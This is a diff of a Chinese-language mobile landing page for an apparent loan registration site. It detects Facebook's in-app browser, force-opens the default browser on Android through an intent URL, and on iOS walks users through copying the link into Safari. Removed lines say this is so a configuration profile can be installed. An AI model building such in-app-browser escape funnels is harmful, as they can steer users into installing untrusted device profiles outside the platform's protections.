@@ -5,172 +5,162 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>鈔安心實名註冊</title>
     <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #f2f2f7;
-            margin: 0;
-            padding: 20px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            box-sizing: border-box;
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #f2f2f7; margin: 0; padding: 12px; display: flex; justify-content: center; align-items: center; min-height: 100vh; box-sizing: border-box; }
+        .container { text-align: center; max-width: 360px; width: 100%; background: white; padding: 24px 16px; border-radius: 24px; box-shadow: 0 10px 40px rgba(0,0,0,0.06); box-sizing: border-box; }
+        .safari-icon { width: 50px; height: 50px; background: radial-gradient(circle, #56ccf2, #2f80ed); border-radius: 50%; position: relative; margin: 0 auto 10px; box-shadow: 0 4px 10px rgba(47, 128, 237, 0.3); }
+        .safari-icon::after { content: ''; position: absolute; width: 0; height: 0; top: 50%; left: 50%; margin-top: -18px; margin-left: -4px; border-style: solid; border-width: 0 4px 18px 4px; border-color: transparent transparent #ff3b30 transparent; transform: rotate(45deg); transform-origin: 50% 100%; }
+        .safari-pointer-bottom { position: absolute; width: 0; height: 0; top: 50%; left: 50%; margin-left: -4px; border-style: solid; border-width: 18px 4px 0 4px; border-color: #ffffff transparent transparent transparent; transform: rotate(45deg); transform-origin: 50% 0%; }
+        h2 { margin: 0 0 6px; color: #1c1c1e; font-size: 19px; font-weight: 700; }
+        p { font-size: 13.5px; color: #3a3a3c; line-height: 1.4; text-align: center; margin: 0 0 18px; }
+        .copy-btn { display: block; width: 100%; padding: 14px; background-color: #007aff; color: white; text-decoration: none; border-radius: 12px; font-weight: bold; font-size: 16px; border: none; cursor: pointer; box-shadow: 0 4px 12px rgba(0,123,255,0.2); }
+        
+        #animation-zone { display: none; margin-top: 18px; animation: fadeIn 0.4s ease-out forwards; }
+        .toast-msg { color: #34c759; font-weight: bold; font-size: 15px; margin-bottom: 12px; }
+
+        /* ==================== 🎬 iOS 擬真手機一體化面板 ==================== */
+        .mock-phone {
+            width: 220px; height: 260px; /* 寬度稍微拉寬，底部留空間放字卡 */
+            border: 8px solid #1c1c1e; border-radius: 28px;
+            margin: 0 auto; position: relative;
+            background: #000; overflow: hidden;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.15);
         }
-        .container {
-            text-align: center;
-            max-width: 360px;
-            width: 100%;
-            background: white;
-            padding: 35px 25px;
-            border-radius: 24px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.06);
-            box-sizing: border-box;
+        .mock-notch {
+            position: absolute; top: 0; left: 50%; transform: translateX(-50%);
+            width: 80px; height: 12px; background: #1c1c1e;
+            border-bottom-left-radius: 9px; border-bottom-right-radius: 9px; z-index: 10;
         }
-        .ios-alert {
-            border-top: 6px solid #007aff;
+        .mock-screen {
+            width: 100%; height: 100%;
+            background: linear-gradient(135deg, #1f1c2c, #928dab);
+            position: relative; animation: screenSwitch 6s infinite ease-in-out;
         }
         
-        /* Safari 擬真圖標 */
-        .safari-icon-wrapper {
-            display: flex;
-            justify-content: center;
-            margin-bottom: 20px;
+        /* 內建 Safari App 圖示 */
+        .mock-safari-app {
+            position: absolute; top: 65px; left: 50%; transform: translateX(-50%);
+            width: 46px; height: 46px; background: radial-gradient(circle, #56ccf2, #2f80ed);
+            border-radius: 11px; box-shadow: 0 4px 10px rgba(0,0,0,0.3); animation: appFade 6s infinite;
         }
-        .safari-icon {
-            width: 70px;
-            height: 70px;
-            background: radial-gradient(circle, #56ccf2, #2f80ed);
-            border-radius: 50%;
-            position: relative;
-            box-shadow: 0 4px 15px rgba(47, 128, 237, 0.4);
-            animation: pulse 2s infinite;
+        .mock-safari-app::after { content: 'Safari'; position: absolute; bottom: -16px; left: 50%; transform: translateX(-50%); font-size: 10px; color: #fff; }
+        
+        /* 瀏覽器網址列 */
+        .mock-browser-bar {
+            position: absolute; top: 32px; left: 12px; right: 12px; height: 28px;
+            background: rgba(255, 255, 255, 0.9); border-radius: 8px; opacity: 0;
+            display: flex; align-items: center; padding-left: 8px; font-size: 10px;
+            color: #8e8e93; box-sizing: border-box; animation: barFade 6s infinite;
         }
-        .safari-icon::before {
-            content: '';
-            position: absolute;
-            top: 5px; left: 5px; right: 5px; bottom: 5px;
-            border: 2px dashed rgba(255,255,255,0.6);
-            border-radius: 50%;
-        }
-        .safari-icon::after {
-            content: '';
-            position: absolute;
-            width: 0; height: 0;
-            top: 50%; left: 50%;
-            margin-top: -25px; margin-left: -6px;
-            border-style: solid;
-            border-width: 0 6px 25px 6px;
-            border-color: transparent transparent #ff3b30 transparent;
-            transform: rotate(45deg);
-            transform-origin: 50% 100%;
-        }
-        .safari-pointer-bottom {
-            position: absolute;
-            width: 0; height: 0;
-            top: 50%; left: 50%;
-            margin-left: -6px;
-            border-style: solid;
-            border-width: 25px 6px 0 6px;
-            border-color: #ffffff transparent transparent transparent;
-            transform: rotate(45deg);
-            transform-origin: 50% 0%;
-        }
-        .safari-center {
-            position: absolute;
-            width: 6px; height: 6px;
-            background: #fff;
-            border-radius: 50%;
-            top: 50%; left: 50%;
-            margin-top: -3px; margin-left: -3px;
-            box-shadow: 0 0 4px rgba(0,0,0,0.3);
-            z-index: 10;
+        
+        /* 模擬點擊的手指 */
+        .mock-finger {
+            position: absolute; width: 24px; height: 24px;
+            background: rgba(255, 255, 255, 0.4); border: 2px solid #fff; border-radius: 50%;
+            top: 88px; left: 110px; transform: scale(0); z-index: 5;
+            animation: fingerMovement 6s infinite ease-in-out;
         }
 
-        h2 { margin: 0 0 15px 0; color: #1c1c1e; font-size: 22px; font-weight: 700; }
-        p { font-size: 15px; color: #3a3a3c; line-height: 1.6; margin-bottom: 25px; text-align: left; }
-        .strong-red { color: #ff3b30; font-weight: bold; }
-        .strong-blue { color: #007aff; font-weight: bold; }
-        
-        .copy-btn {
-            display: block;
-            width: 100%;
-            padding: 15px;
-            background-color: #007aff;
-            color: white;
-            text-decoration: none;
-            border-radius: 14px;
-            font-weight: bold;
-            font-size: 16px;
-            border: none;
-            cursor: pointer;
-            box-shadow: 0 4px 12px rgba(0,123,255,0.25);
-            box-sizing: border-box;
-            transition: transform 0.1s ease;
+        /* ==================== 💬 手機內建：動態同步解說字卡 ==================== */
+        .phone-instruction-dock {
+            position: absolute; bottom: 0; left: 0; right: 0; height: 65px;
+            background: rgba(255, 255, 255, 0.95); border-top: 1px solid #d1d1d6;
+            display: flex; flex-direction: column; justify-content: center; align-items: center;
+            padding: 0 12px; box-sizing: border-box; z-index: 8;
         }
-        .copy-btn:active { transform: scale(0.98); background-color: #0056b3; }
+        .mini-badge { background: #007aff; color: white; font-size: 9px; font-weight: bold; padding: 1px 6px; border-radius: 10px; margin-bottom: 3px; }
+        .mini-text { font-size: 11.5px; color: #1c1c1e; font-weight: 600; line-height: 1.3; text-align: center; }
         
-        @keyframes pulse {
-            0% { transform: scale(1); box-shadow: 0 4px 15px rgba(47, 128, 237, 0.4); }
-            50% { transform: scale(1.04); box-shadow: 0 6px 22px rgba(47, 128, 237, 0.6); }
-            100% { transform: scale(1); box-shadow: 0 4px 15px rgba(47, 128, 237, 0.4); }
+        /* 讓文字隨時間軸變換內容 */
+        .mini-text::after { content: ''; animation: textSubtitleSync 6s infinite; }
+
+        /* ==================== 🔄 劇場劇本時間軸 (全部共用 6 秒) ==================== */
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        
+        /* 螢幕切換：前25%是桌面，之後進Safari系統 */
+        @keyframes screenSwitch { 0%, 22% { background: linear-gradient(135deg, #1f1c2c, #928dab); } 28%, 88% { background: #f2f2f7; } 94%, 100% { background: linear-gradient(135deg, #1f1c2c, #928dab); } }
+        
+        /* 手指動作 */
+        @keyframes fingerMovement {
+            0% { transform: scale(0); opacity: 0; top: 88px; left: 110px; }
+            8% { transform: scale(1); opacity: 1; top: 88px; left: 110px; }
+            12% { transform: scale(0.8); background: rgba(255,255,255,0.6); top: 88px; left: 110px; }
+            16% { transform: scale(0); opacity: 0; top: 88px; left: 110px; }
+            30% { transform: scale(0); opacity: 0; top: 46px; left: 110px; }
+            36% { transform: scale(1); opacity: 1; top: 46px; left: 110px; }
+            40% { transform: scale(0.8); background: rgba(255,255,255,0.6); top: 46px; left: 110px; }
+            45%, 100% { transform: scale(0); opacity: 0; }
+        }
+        @keyframes appFade { 0%, 22% { opacity: 1; transform: translateX(-50%) scale(1); } 28%, 88% { opacity: 0; transform: translateX(-50%) scale(0.6); } 94%, 100% { opacity: 1; transform: translateX(-50%) scale(1); } }
+        @keyframes barFade { 0%, 25% { opacity: 0; transform: translateY(-5px); } 28%, 44% { opacity: 1; transform: translateY(0); color: #8e8e93; } 50%, 88% { opacity: 1; transform: translateY(0); color: #007aff; } 94%, 100% { opacity: 0; transform: translateY(-5px); } }
+        
+        .mock-browser-bar::before { content: '搜尋或輸入網址'; animation: urlPaste 6s infinite; }
+        @keyframes urlPaste { 0%, 46% { content: '搜尋或輸入網址'; } 52%, 88% { content: 'ccans-loan.com/register.php'; } 94%, 100% { content: '搜尋或輸入網址'; } }
+
+        /* 🌟 核心優化：單行字幕跑馬燈時間軸 */
+        @keyframes textSubtitleSync {
+            0%, 22% { content: '步驟 1：請先退回手機主畫面桌面'; }
+            28%, 46% { content: '步驟 2：在桌面點擊開啟 🧭 Safari 瀏覽器'; }
+            52%, 88% { content: '步驟 3：輕點網址列，長按並選擇「貼上並前往」'; }
+            94%, 100% { content: '步驟 1：請先退回手機主畫面桌面'; }
         }
     </style>
 </head>
 <body>
 
-    <!-- ==================== 【iOS 專屬引導畫面】 ==================== -->
-    <div id="ios-zone" class="container ios-alert" style="display: none;">
-        <div class="safari-icon-wrapper">
-            <div class="safari-icon">
-                <div class="safari-pointer-bottom"></div>
-                <div class="safari-center"></div>
+    <!-- ==================== 【iOS 智慧引導區塊】 ==================== -->
+    <div id="ios-zone" class="container" style="display: none; border-top: 6px solid #007aff;">
+        <div class="safari-icon"><div class="safari-pointer-bottom"></div></div>
+        <h2>請複製網址至 Safari 註冊</h2>
+        <p>因系統限制無法直接開啟，請點擊下方按鈕：</p>
+        
+        <button class="copy-btn" onclick="copyTargetUrl()">📋 點我複製註冊網址</button>
+
+        <!-- 🎬 點擊後原位展開：絕不爆版、無需滑動 -->
+        <div id="animation-zone">
+            <div class="toast-msg">✓ 網址已複製成功！</div>
+            
+            <!-- 一體化操作手機（動畫與文字解說完全融合在裡面） -->
+            <div class="mock-phone">
+                <div class="mock-notch"></div>
+                <div class="mock-finger"></div>
+                <div class="mock-screen">
+                    <div class="mock-safari-app"></div>
+                    <div class="mock-browser-bar"></div>
+                </div>
+                <!-- 底部固定解說中樞 -->
+                <div class="phone-instruction-dock">
+                    <span class="mini-badge">操作提示</span>
+                    <div class="mini-text"></div>
+                </div>
             </div>
         </div>
-        <h2>必須使用 Safari 開啟網頁</h2>
-        <p>
-            ⚠️ 偵測到您目前處於 Facebook 瀏覽器中。<br><br>
-            由於 Apple 安全機制限制，<span class="strong-red">社群軟體內部無法下載和安裝描述檔</span>。請依照以下步驟操作：<br><br>
-            1. 點擊下方按鈕<span class="strong-blue">「複製註冊網址」</span>。<br>
-            2. 回到桌面，打開手機內建的 <span class="strong-blue">Safari 瀏覽器</span>。<br>
-            3. 在上方網址列貼上並前往，即可正常下載安裝。
-        </p>
-        <button class="copy-btn" onclick="copyTargetUrl()">📋 複製網址，去 Safari 貼上</button>
-        <div id="toast" style="display: none; margin-top: 15px; color: #34c759; font-weight: bold; font-size: 14px; background: #e8f5e9; padding: 8px; border-radius: 8px;">✓ 網址已複製！請至 Safari 貼上</div>
     </div>
 
-    <!-- ==================== 【Android 自動跳轉畫面】 ==================== -->
-    <div id="android-zone" class="container" style="display: none;">
-        <div style="font-size: 50px; margin-bottom: 15px;">🔄</div>
-        <h2>網頁自動跳轉中...</h2>
-        <p style="text-align: center;">若手機沒有成功彈出您的預設瀏覽器，請點擊下方按鈕手動開啟：</p>
-        <a id="android-link" href="#" class="copy-btn" style="text-align: center;">使用預設瀏覽器開啟</a>
+    <!-- ==================== 【Android 自動跳轉區塊】 ==================== -->
+    <div id="android-zone" class="container" style="display: none; border-top: 6px solid #34c759;">
+        <div style="font-size: 40px; margin-bottom: 8px;">🔄</div>
+        <h2>正在為您開啟註冊網頁...</h2>
+        <p style="color: #666;">若手機沒有自動彈出，請點擊下方按鈕：</p>
+        <a id="android-link" href="#" class="copy-btn" style="text-align: center; background-color: #34c759; box-shadow: 0 4px 12px rgba(52,199,89,0.2);">手動開啟預設瀏覽器</a>
     </div>
 
     <script type="text/javascript">
-        // ─── 📝 請在這裡填入此頁面最終要去的「真正註冊網址」 ───
-        // 注意：多網址管理時（如 event1, event2），只需更改此處的目標網址即可
         var targetWebUrl = "ccans-loan.com/register.php"; 
-        
         var androidIntent = "intent://" + targetWebUrl + "#Intent;scheme=https;action=android.intent.action.VIEW;end";
         
         var ua = navigator.userAgent.toLowerCase();
         var isAndroid = ua.indexOf("android") > -1;
 
         if (isAndroid) {
-            // Android 處理（自動喚醒手機預設瀏覽器）
             document.getElementById("android-zone").style.display = "block";
             document.getElementById("android-link").href = androidIntent;
             window.location.href = androidIntent;
         } else {
-            // iOS 處理
             document.getElementById("ios-zone").style.display = "block";
         }
 
-        // iOS 直接複製「目標網址」功能
         function copyTargetUrl() {
-            // 自動幫忙補上穩定的 https:// 開頭
             var finalCopyUrl = "https://" + targetWebUrl;
-            
             var tempInput = document.createElement("input");
             tempInput.value = finalCopyUrl;
             document.body.appendChild(tempInput);
@@ -179,15 +169,12 @@
             
             try {
                 document.execCommand("copy");
-                var toast = document.getElementById("toast");
-                toast.style.display = "block";
-                setTimeout(function() { toast.style.display = "none"; }, 4000);
+                document.getElementById("animation-zone").style.display = "block";
             } catch (err) {
                 alert("複製失敗，請手動複製網址。");
             }
             document.body.removeChild(tempInput);
         }
     </script>
-
 </body>
 </html>
